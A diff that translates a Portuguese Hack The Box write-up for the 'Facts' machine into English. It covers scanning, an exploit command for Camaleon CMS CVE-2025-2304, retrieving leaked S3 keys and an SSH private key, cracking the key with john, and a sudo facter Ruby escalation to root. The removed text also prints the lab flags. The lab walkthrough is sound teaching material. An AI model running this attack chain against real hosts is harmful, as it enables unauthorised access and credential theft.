@@ -1,234 +1,167 @@
-# Hack The Box — Facts
+## Summary
 
-![HTB](https://img.shields.io/badge/Platform-Hack%20The%20Box-green)
-![Difficulty](https://img.shields.io/badge/Difficulty-Easy-blue)
-![OS](https://img.shields.io/badge/OS-Linux-orange)
-![Category](https://img.shields.io/badge/Category-Web%20%2B%20Privesc-red)
+Facts is an Easy Linux machine running **Camaleon CMS**, vulnerable to an
+authenticated privilege escalation (CVE-2025-2304). Exploiting it exposes AWS S3
+credentials pointing at an internal S3-compatible service, where a private SSH
+key is stored. The key (cracked with `john`) grants SSH access, and a sudo rule
+on **facter** is abused to run arbitrary Ruby and escalate to **root**.
 
----
+## Machine Information
 
-# Informações da Máquina
+| Name | Difficulty | OS | Platform |
+| --- | --- | --- | --- |
+| Facts | Easy | Linux | Hack The Box |
 
-| Nome  | Dificuldade | Plataforma     | OS    |
-| ----- | ---------- | ------------ | ----- |
-| Facts | Easy       | Hack The Box | Linux |
+## Attack Path
 
----
+1. Nmap reveals HTTP and SSH.
+2. Web enumeration identifies an admin panel.
+3. The Camaleon CMS is exploited (CVE-2025-2304).
+4. AWS S3 credentials are extracted.
+5. A private SSH key is downloaded from an internal bucket.
+6. SSH access is obtained.
+7. sudo enumeration finds an allowed `facter` binary.
+8. `facter` is abused to run Ruby and escalate to root.
 
-# Superfície de ataque
+## Reconnaissance
 
+Initial enumeration was performed with **Nmap**.
+
+```bash
+nmap -sV -T5 -sC 10.129.19.58
 ```
-1. Nmap scan → descoberta de HTTP e SSH
-2. Enumeração web → identificação de painel admin
-3. Exploração do Camaleon CMS (CVE-2025-2304)
-4. Extração de credenciais S3
-5. Download de chave SSH privada
-6. Acesso via SSH
-7. Enumeração de privilégios (sudo)
-8. Escalação via fator (Ruby exploit)
+
+| Port | Service | Notes |
+| --- | --- | --- |
+| 22 | SSH | OpenSSH 9.9p1 |
+| 80 | HTTP | nginx (Ubuntu) |
+
+## Web Enumeration
+
+The web application on port 80 was a site named **Facts**. Content discovery
+with Gobuster:
+
+```bash
+gobuster dir -u http://facts.htb/ -w /usr/share/wordlists/dirb/common.txt
 ```
 
----
+Findings:
 
-# Reconhecimento
+- `/admin` redirects to `/admin/login`
+- Hidden directories (`.git`, env-like files)
+- Evidence of an administrative panel
 
-A enumeração inicial foi realizada com Nmap.
+## Exploitation — Camaleon CMS (CVE-2025-2304)
 
-``` nmap -sV -T5 -sC 10.129.19.58 ```
+The application uses **Camaleon CMS v2.9.0**, vulnerable to an authenticated
+privilege escalation (CVE-2025-2304).
 
+```bash
+python exploit.py -u http://facts.htb/ -U abc -P abc -e -r
+```
 
-![Nmap Scan](screenshots/nmap.png)
-
-### Descobertas
-
-| Porta | Serviço | Observações                  |
-| ---- | ------- | ---------------------- |
-| 22   | SSH     | OpenSSH 9.9p1         |
-| 80   | HTTP    | nginx (Ubuntu)        |
-
----
-
-# Enumeração Web
-
-A aplicação web rodando na porta 80 revelou um site chamado **Facts**.
-
-![Web Page](screenshots/web.png)
-
-Enumeração com Gobuster:
-
-```gobuster dir -u http://facts.htb/ -w /usr/share/wordlists/dirb/common.txt ```
-
-
-![Gobuster](screenshots/gobuster.png)
-
-### Descobertas
-
-- `/admin` → redireciona para `/admin/login`
-- Diretórios ocultos (.git, .env-like, etc)
-- Indício de painel administrativo
-
----
-
-# Exploração
-
-A aplicação utiliza o **Camaleon CMS v2.9.0**, vulnerável a:
-
-> **CVE-2025-2304 — Privilege Escalation (Authenticated)**
-
-Exploit utilizado: ``` python exploit.py -u http://facts.htb/ -U abc -P abc -e -r ```
-
-
-![Exploit](screenshots/exploit.png)
-
-### Resultado
-
-- Elevação de privilégio dentro do CMS
-- Extração de credenciais AWS S3:
+This elevated privileges inside the CMS and exposed AWS S3 credentials:
 
 ```
 Access Key: AKIA13F1EA8B94A4DE85
 Secret Key: AiZzRMmU6R3jv2SYM6D5hLjifqmIGCio9L0g/R2r
-Endpoint: http://localhost:54321
+Endpoint:   http://localhost:54321
 ```
 
----
+## Initial Access (User)
 
-# Acesso Inicial
+Using the AWS CLI against the internal endpoint:
 
-Utilizando AWS CLI: ``` aws --endpoint-url http://facts.htb:54321 s3 ls ```
-
-
-Buckets encontrados:
-
-- internal
-- randomfacts
-
-Download de arquivos sensíveis:
-
-``` aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/authorized_keys . ```
-``` aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 . ```
-
-
-Chave privada obtida:
-
-![AWS](screenshots/aws.png)
-
-Conversão + crack:
-
-``` ssh2john id_ed25519 > hash ```
-``` john hash --wordlist=/usr/share/wordlists/rockyou.txt ```
-
-
-![John](screenshots/john.png)
-
-Senha encontrada: ``` dragonballz ```
-
-Login SSH: ``` ssh -i id_ed25519 trivia@10.129.19.58 ```
-
----
-
-# Flag de Usuário
-
-``` cat /home/william/user.txt ```
-
-![User Flag](screenshots/user-flag.png)
-
-``` 4d4b5ae95ae5d03f02e36d20ed2fd319 ```
-
-
----
-
-# Escalação de Privilégio
-
-Verificação de permissões sudo: ``` sudo -l ```
-
-Resultado:
-``` 
-User trivia may run:
-/usr/bin/facter
+```bash
+aws --endpoint-url http://facts.htb:54321 s3 ls
 ```
 
----
+Two buckets were found (`internal`, `randomfacts`). Sensitive files were
+downloaded from the `internal` bucket:
 
-# Explorando a Escalação de Privilégio
+```bash
+aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/authorized_keys .
+aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .
+```
 
-O `facter` permite execução de código Ruby arbitrário.
+The private key passphrase was cracked offline:
 
-Exploit:
+```bash
+ssh2john id_ed25519 > hash
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+```
 
 ```
-cd /tmp
-cat > pwn.rb
+passphrase: dragonballz
+```
 
+SSH access was then obtained with the key:
+
+```bash
+ssh -i id_ed25519 trivia@10.129.19.58
+```
+
+The user flag lives at `/home/william/user.txt`.
+
+## Privilege Escalation
+
+### Enumeration
+
+```bash
+sudo -l
+```
+
+```
+User trivia may run: /usr/bin/facter
+```
+
+### Abusing facter
+
+`facter` loads custom facts, allowing arbitrary Ruby execution. A malicious fact
+was created to spawn a privileged shell:
+
+```ruby
+# /tmp/pwn.rb
 Facter.add(:pwn) do
   setcode { exec("/bin/bash -p") }
 end
 ```
 
-Execução: ``` sudo facter --custom-dir=/tmp pwn ```
+```bash
+sudo facter --custom-dir=/tmp pwn
+```
 
-# Flag de Root
+This spawned a shell as root. The root flag lives at `/root/root.txt`.
 
-``` cat /root/root.txt ```
+## Vulnerability Analysis
 
-![Root Flag](screenshots/root-flag.png)
+**Privilege escalation in Camaleon CMS (CVE-2025-2304)** — an authenticated flaw
+allowed elevating privileges within the CMS and reading sensitive data,
+including the AWS S3 credentials. Fix: upgrade Camaleon CMS and enforce strict
+authorization on administrative actions.
 
-``` a09e07c25af8e613bfc5747fb73823d3 ```
+**Insecure S3 exposure** — an internal S3 bucket was accessible and stored
+`.ssh` private keys, turning credential disclosure into direct system access.
+Fix: require authentication on the S3 service, restrict bucket policies, and
+never store private keys in object storage.
 
-# Vulnerabilidades Identificadas
+**Misconfigured sudo (`facter`)** — `facter` could be run as root and executes
+arbitrary Ruby through custom facts, giving full root. Fix: remove the sudo rule
+and avoid granting sudo on interpreters or tools that load external code.
 
-### Escalação de Privilégio no Camaleon CMS (CVE-2025-2304)
+## Tools Used
 
-Descrição:
+- Nmap
+- Gobuster
+- AWS CLI
+- John the Ripper
+- SSH
+- Python exploit
+- Facter
 
-- Vulnerabilidade autenticada que permite elevação de privilégios
-- Permite acesso a dados sensíveis (credenciais)
+## Key Takeaways
 
-Impacto:
-
-- Comprometimento total da aplicação
-- Acesso a infraestrutura interna (S3)
-
-### Exposição Insegura de S3
-
-Descrição:
-
-- Bucket S3 interno acessível
-- Continha arquivos sensíveis (.ssh)
-
-Impacto:
-
-- Exposição de chave privada SSH
-- Acesso direto ao sistema
-
-### Má Configuração de sudo (facter)
-
-Descrição:
-
-- Execução de binário com privilégios root
-- Permite execução de código Ruby
-
-Impacto:
-
-- Escalação completa para root
-
-# Ferramentas Utilizadas
-
-* Nmap
-* Gobuster
-* AWS CLI
-* John the Ripper
-* SSH
-* Python exploit
-* Facter
-
-# Principais Aprendizados
-
-* Sempre verificar CMS e versão → exploits públicos
-* Credenciais expostas frequentemente levam ao comprometimento completo
-* Buckets S3 mal configurados são críticos
-* sudo com binários interpretados (Ruby/Python) = privesc fácil
-
-# Autor
-
-GitHub: https://github.com/ninjaa-exe
+- Always fingerprint the CMS and version to find public exploits.
+- Exposed credentials frequently cascade into full compromise.
+- Misconfigured S3 buckets are critical when they hold keys or secrets.
+- sudo on interpreted binaries (Ruby/Python) is an easy privesc path.
